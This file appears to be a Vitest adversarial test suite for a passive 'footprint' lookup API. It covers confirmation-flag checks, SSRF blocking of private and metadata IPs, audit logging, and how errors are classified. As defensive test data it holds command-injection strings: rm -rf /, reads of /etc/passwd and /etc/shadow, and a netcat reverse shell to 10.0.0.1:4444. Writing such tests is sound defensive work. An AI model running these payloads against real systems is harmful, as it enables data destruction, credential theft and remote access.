// tests/adversarial/footprint_adversarial.test.ts
// Empirical Adversarial Stress Test Suite for Milestone M4 Challenger
// Targets: Passive Confirmation Safeguard, SSRF Bypass & Target Validation,
// Negative Result vs Outage Taxonomy, and Active Probe Injection.

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import request from 'supertest';
import Database from 'better-sqlite3';
import { createApp } from '../../server/app.js';
import { runMigrations } from '../../server/db/migrate.js';
import { seedDatabase } from '../../server/db/seed.js';
// @ts-expect-error JS module without declaration file
import { validateFootprintInput, classifyFootprintResponse, FOOTPRINT_STATUS } from '../../public/js/components/footprint_ui.js';

describe('M4 Adversarial: Passive Confirmation Safeguard Bypass', () => {
  let db: Database.Database;
  let app: any;

  beforeEach(() => {
    db = new Database(':memory:');
    db.pragma('foreign_keys = ON');
    runMigrations(db);
    seedDatabase(db);
    app = createApp(db);
  });

  afterEach(() => {
    db.close();
  });

  it('ADV-PASSIVE-1: Rejects payload without confirm_passive with HTTP 400', async () => {
    const res = await request(app)
      .post('/api/v1/investigate/footprint')
      .set('x-bypass-csrf', 'true')
      .send({
        query_type: 'DOMAIN',
        target: 'example.com'
      });

    expect(res.status).toBe(400);
    expect(res.body.success).toBe(false);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
    expect(res.body.error.details.some((d: any) => /confirm_passive|confirmation/i.test(d.message || d.path))).toBe(true);
  });

  it('ADV-PASSIVE-2: Rejects payload with confirm_passive: false with HTTP 400', async () => {
    const res = await request(app)
      .post('/api/v1/investigate/footprint')
      .set('x-bypass-csrf', 'true')
      .send({
        query_type: 'DOMAIN',
        target: 'example.com',
        confirm_passive: false
      });

    expect(res.status).toBe(400);
    expect(res.body.success).toBe(false);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });

  it('ADV-PASSIVE-3: Rejects unexpected parameters in payload via .strict() schema enforcement', async () => {
    const unexpectedPayloads = [
      {
        query_type: 'DOMAIN',
        target: 'example.com',
        confirm_passive: true,
        active_scan: true
      },
      {
        query_type: 'DOMAIN',
        target: 'example.com',
        confirm_passive: true,
        port_scan: [21, 22, 80, 443]
      },
      {
        query_type: 'DOMAIN',
        target: 'example.com',
        confirm_passive: true,
        extra_param: 'unexpected'
      },
      {
        query_type: 'DOMAIN',
        target: 'example.com',
        confirm_passive: true,
        raw_cmd: 'cat /etc/passwd'
      }
    ];

    for (const payload of unexpectedPayloads) {
      const res = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send(payload);

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('VALIDATION_ERROR');
      expect(res.body.error.details[0].message).toMatch(/Unrecognized key/i);
    }
  });
});

describe('M4 Adversarial: SSRF Bypass & Target Validation', () => {
  let db: Database.Database;
  let app: any;

  beforeEach(() => {
    db = new Database(':memory:');
    db.pragma('foreign_keys = ON');
    runMigrations(db);
    seedDatabase(db);
    app = createApp(db);
  });

  afterEach(() => {
    db.close();
  });

  const FORBIDDEN_TARGETS = [
    '127.0.0.1',
    'localhost',
    '::1',
    '169.254.169.254',
    '10.0.0.1',
    '192.168.1.1',
    '::ffff:127.0.0.1',
    'fe80::1'
  ];

  for (const target of FORBIDDEN_TARGETS) {
    it(`ADV-SSRF-IP: blocks private/forbidden target '${target}' as IP with HTTP 400 SSRF_BLOCKED`, async () => {
      const res = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({
          query_type: 'IP',
          target,
          confirm_passive: true
        });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('SSRF_BLOCKED');
      expect(res.body.error.message).toMatch(/restricted subnet|INVALID_IP_FORMAT/i);
    });
  }

  it('ADV-SSRF-AUDIT: confirms audit logging records SSRF attempts', async () => {
    const initialCount = (db.prepare("SELECT count(*) as cnt FROM audit_events WHERE action = 'PASSIVE_FOOTPRINT_QUERY'").get() as any).cnt;

    await request(app)
      .post('/api/v1/investigate/footprint')
      .set('x-bypass-csrf', 'true')
      .send({
        query_type: 'IP',
        target: '169.254.169.254',
        confirm_passive: true
      });

    const newCount = (db.prepare("SELECT count(*) as cnt FROM audit_events WHERE action = 'PASSIVE_FOOTPRINT_QUERY'").get() as any).cnt;
    expect(newCount).toBe(initialCount + 1);

    const latest = db.prepare("SELECT * FROM audit_events WHERE action = 'PASSIVE_FOOTPRINT_QUERY' ORDER BY id DESC LIMIT 1").get() as any;
    expect(latest.entity_id).toBe('169.254.169.254');
    expect(latest.entity_type).toBe('IP');
  });
});

describe('M4 Adversarial: Negative Result vs Outage Taxonomy', () => {
  let db: Database.Database;
  let app: any;

  beforeEach(() => {
    db = new Database(':memory:');
    db.pragma('foreign_keys = ON');
    runMigrations(db);
    seedDatabase(db);
    app = createApp(db);
  });

  afterEach(() => {
    db.close();
  });

  it('ADV-TAXONOMY-1: Non-existent domain returns HTTP 200 { found: false, records: [] }, NOT an error', async () => {
    const nxDomain = 'nxdomain-adversarial-test-eod-2026.org';

    const res = await request(app)
      .post('/api/v1/investigate/footprint')
      .set('x-bypass-csrf', 'true')
      .send({
        query_type: 'DOMAIN',
        target: nxDomain,
        confirm_passive: true
      });

    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(res.body.passive).toBe(true);
    expect(res.body.found).toBe(false);
    expect(Array.isArray(res.body.records)).toBe(true);
    expect(res.body.records.length).toBe(0);
    expect(res.body.evidence_id).toBeNull();
  });

  it('ADV-TAXONOMY-2: UI badge classification for confirmed negative result displays [NO RECORDS FOUND - 200 OK] without retry', () => {
    const mockNegativeResponse = {
      success: true,
      target: 'nxdomain-adversarial-test-eod-2026.org',
      query_type: 'DOMAIN',
      passive: true,
      found: false,
      records: [],
      evidence_id: null
    };

    const classified = classifyFootprintResponse(200, mockNegativeResponse, null);

    expect(classified.status).toBe(FOOTPRINT_STATUS.NEGATIVE_RESULT);
    expect(classified.badgeText).toBe('NO RECORDS FOUND - 200 OK');
    expect(classified.badgeClass).toBe('badge-neutral');
    expect(classified.canRetry).toBe(false);
    expect(classified.canAttach).toBe(false);
    expect(classified.records).toHaveLength(0);
  });

  it('ADV-TAXONOMY-3: Simulated upstream timeout (504) classifies as UPSTREAM_FAILURE with retry enabled', () => {
    const mockUpstreamError = {
      statusCode: 504,
      error: {
        code: 'UPSTREAM_DNS_TIMEOUT',
        message: 'Upstream DNS resolver timed out after 5000ms'
      }
    };

    const classified = classifyFootprintResponse(504, null, mockUpstreamError.error);

    expect(classified.status).toBe(FOOTPRINT_STATUS.UPSTREAM_FAILURE);
    expect(classified.badgeText).toBe('UPSTREAM QUERY FAILED - 504 (UPSTREAM_DNS_TIMEOUT)');
    expect(classified.badgeClass).toBe('badge-danger');
    expect(classified.canRetry).toBe(true);
    expect(classified.canAttach).toBe(false);
  });

  it('ADV-TAXONOMY-4: Simulated upstream 502 Bad Gateway classifies as retryable error', () => {
    const classified = classifyFootprintResponse(502, null, {
      code: 'UPSTREAM_RDAP_ERROR',
      message: 'RDAP gateway returned invalid payload'
    });

    expect(classified.status).toBe(FOOTPRINT_STATUS.UPSTREAM_FAILURE);
    expect(classified.badgeText).toBe('UPSTREAM QUERY FAILED - 502 (UPSTREAM_RDAP_ERROR)');
    expect(classified.badgeClass).toBe('badge-danger');
    expect(classified.canRetry).toBe(true);
  });
});

describe('M4 Adversarial: Active Probe Injection', () => {
  let db: Database.Database;
  let app: any;

  beforeEach(() => {
    db = new Database(':memory:');
    db.pragma('foreign_keys = ON');
    runMigrations(db);
    seedDatabase(db);
    app = createApp(db);
  });

  afterEach(() => {
    db.close();
  });

  it('ADV-PROBE-1: Port specification in DOMAIN query is sanitized (port stripped, no port probe dispatched)', async () => {
    const res = await request(app)
      .post('/api/v1/investigate/footprint')
      .set('x-bypass-csrf', 'true')
      .send({
        query_type: 'DOMAIN',
        target: 'example.com:22',
        confirm_passive: true
      });

    // Sanitization: split(':')[0] cleans the domain to 'example.com'
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(res.body.passive).toBe(true);
  });

  it('ADV-PROBE-2: Port specification in IP query is rejected with HTTP 400 SSRF_BLOCKED due to invalid format', async () => {
    const res = await request(app)
      .post('/api/v1/investigate/footprint')
      .set('x-bypass-csrf', 'true')
      .send({
        query_type: 'IP',
        target: '192.168.1.1:22',
        confirm_passive: true
      });

    expect(res.status).toBe(400);
    expect(res.body.success).toBe(false);
    expect(res.body.error.code).toBe('SSRF_BLOCKED');
  });

  it('ADV-PROBE-3: Command injection syntax in DOMAIN query cannot execute shell commands and handles safely', async () => {
    const commandInjectionPayloads = [
      'example.com; nmap -sS target.com',
      'example.com | cat /etc/passwd',
      'example.com && rm -rf /',
      'example.com`id`',
      'example.com$(whoami)'
    ];

    for (const target of commandInjectionPayloads) {
      const res = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({
          query_type: 'DOMAIN',
          target,
          confirm_passive: true
        });

      // Handled as literal domain: fails DNS safely or returns 200 with found: false
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.found).toBe(false);
      expect(res.body.records).toHaveLength(0);
    }
  });

  it('ADV-PROBE-4: Command injection syntax in IP query is rejected with HTTP 400 SSRF_BLOCKED', async () => {
    const ipInjectionPayloads = [
      '8.8.8.8; id',
      '1.1.1.1 | cat /etc/shadow',
      '127.0.0.1; nc -e /bin/sh 10.0.0.1 4444'
    ];

    for (const target of ipInjectionPayloads) {
      const res = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({
          query_type: 'IP',
          target,
          confirm_passive: true
        });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('SSRF_BLOCKED');
    }
  });

  it('ADV-PROBE-5: Frontend UI validation rejects port syntax and injection characters before query planning', () => {
    // Port syntax rejection
    const domainWithPort = validateFootprintInput('DOMAIN', 'example.com:22');
    expect(domainWithPort.valid).toBe(false);
    expect(domainWithPort.error).toMatch(/Invalid domain name format/i);

    const ipWithPort = validateFootprintInput('IP', '198.51.100.1:8080');
    expect(ipWithPort.valid).toBe(false);
    expect(ipWithPort.error).toMatch(/Invalid IPv4 or IPv6 address format/i);

    // Command injection rejection
    const domainWithInjection = validateFootprintInput('DOMAIN', 'example.com; nmap');
    expect(domainWithInjection.valid).toBe(false);
    expect(domainWithInjection.error).toMatch(/Invalid domain name format/i);

    const ipWithInjection = validateFootprintInput('IP', '198.51.100.1; whoami');
    expect(ipWithInjection.valid).toBe(false);
    expect(ipWithInjection.error).toMatch(/Invalid IPv4 or IPv6 address format/i);

    // Valid inputs pass
    const validDomain = validateFootprintInput('DOMAIN', 'nordic-power.net');
    expect(validDomain.valid).toBe(true);

    const validIp = validateFootprintInput('IP', '198.51.100.14');
    expect(validIp.valid).toBe(true);
  });
});
